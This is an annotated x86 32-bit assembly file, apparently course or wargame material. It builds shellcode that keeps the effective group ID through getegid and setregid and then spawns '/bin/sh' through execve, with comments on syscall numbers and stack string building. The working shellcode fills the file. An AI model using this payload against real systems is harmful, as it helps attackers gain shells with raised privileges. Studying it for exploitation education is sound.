#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
  /*
      Objective:
        Calling three functions.

        int egid = getegid();
        setregid(egid, egid);
        execve("/bin/sh", 0, 0);
  */

  /*
    For 32 bit:

    Check the system call numbers at here:
    https://syscalls.kernelgrok.com/,
    and set showing entries to 100 to see them easier.

    // Syscall numbers
    $SYS_getegid == 50
    $SYS_setregid == 71
    $SYS_execve == 11

    // run syscall
    1. set %eax as the target system call number (e.g., for getegid, it's 50).
    2. set arguments to %ebx (1st), %ecx (2nd), %edx (3rd), %esi (4th), %edi (5)
    3. run 'int $0x80'  <-- an instruction that invokes interrupt 0x80,
        which is the system call activity in (x86/linux, 32bit)

    // building "//bin/sh" on the stack
    x86:
      push  $0                  // mark the end as 00 00 00 00 (4-byte zero)
      push  $0x68732f6e         // push 6e 2f 73 68  (n/sh)
      push  $0x69622f2f         // push 2f 2f 62 69  (//bi

                                // So, it is //bin/sh\0\0\0\0 -> "//bin/sh"

  */
    //int egid = getegid();
    mov $SYS_getegid, %eax
    int $0x80


    //setregid(egid, egid);
    mov %eax, %ebx // 1st arg
    mov %eax, %ecx // 2nd arg

    mov $SYS_setregid, %eax
    int $0x80


    //execve("/bin/sh", 0, 0);

    mov $0, %ecx
    mov $0, %edx

    mov $SYS_execve, %eax


    // ebx = "//bin/sh"
    push  $0                  // mark the end as 00 00 00 00 (4-byte zero)
    push  $0x68732f6e         // push 6e 2f 73 68  (n/sh)
    push  $0x69622f2f         // push 2f 2f 62 69  (//bi

                                // So, it is //bin/sh\0\0\0\0 -> "//bin/sh"

    mov %esp, %ebx

    int $0x80

